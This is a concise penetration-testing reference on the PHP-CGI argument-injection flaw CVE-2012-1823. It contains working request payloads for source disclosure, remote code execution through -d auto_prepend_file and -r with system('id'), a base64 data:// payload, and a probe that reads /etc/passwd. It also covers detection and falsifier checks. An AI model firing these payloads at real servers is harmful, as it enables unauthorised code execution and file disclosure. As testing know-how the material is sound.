# PHP-CGI Parameter Injection — CVE-2012-1823 and the arg-line attack

## The shape — the query string becomes PHP's argv

PHP-CGI (not FPM/mod_php) parses the URI query string as command-line
arguments when the script name contains no `=` and isn't `-`-prefixed
safely. `?-s`, `?-d`, `?-r` pass straight to the PHP binary.

```
GET /index.php?-s              → -s = source highlight — leaks source
GET /index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input
POST body: <?php system("id"); ?>
GET /index.php?-r+phpinfo()    → execute a single statement
```

This is the "cgi-bin/php?-s" attack — source disclosure or direct RCE.

## Detection — is it PHP-CGI?

- `Server:`/`X-Powered-By` headers — `PHP-CGI` banner on error paths
- a `?-s` probe on a php script returns highlighted source → confirmed
- cgi-bin layout `/cgi-bin/php` or `.php` files under a cgi handler
- `php-cgi` in a directory listing; `cgi.fix_pathinfo` quirks

## The `-d` injection — runtime config as argv

```
?-d+allow_url_include=1+-d+auto_prepend_file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOz8%2b
```

`auto_prepend_file` to `php://input`/`data://` — the request body becomes
the prepended file — RCE without a file upload at all; the "upload" is
the POST body.

## The `-r` direct eval

```
/index.php?-r+system("id")
```

Runs `system("id")` as PHP code — `-r` is "run code from command line".

## The arg-injection vs file-upload relation

The php-cgi arg line is one of the few ways an *uncontrolled-file* request
becomes exec — no upload needed. For this skill it matters when:
- the upload lands a `.php` that a PHP-CGI handler runs with arg control
- the cgi handler's params are reachable through the upload feature's
  redirect/serve path

## The modern boundary — CVE-2012-1823 is old

- modern PHP-CGI builds dropped the unescaped-arg parse (the fix checks
  for `=` in the query)
- CGI-arg injection still appears on misconfigured CGI wrappers, `mod_cgi`
  + `AddHandler` setups, and custom scripts that `$_SERVER['QUERY_STRING']`
  → `shell_exec`/`eval`
- treat it as a fingerprint check (`?-s` → source?) not a default plan

## Detection steps

```
1. GET /path/script.php?-s — highlighted source? → vulnerable
2. GET /path/script.php?-d+auto_prepend_file=/etc/passwd — content? → include reached
3. ?-r+phpinfo() — runs? → exec
```

## Falsifiers

- `?-s` returns the script's normal output (no source highlight) —
  arg parsing disabled
- the handler isn't CGI (FPM/mod_php/`php-fpm` doesn't take argv)

## Output to record

- whether `-s` discloses source — that single probe decides the whole class
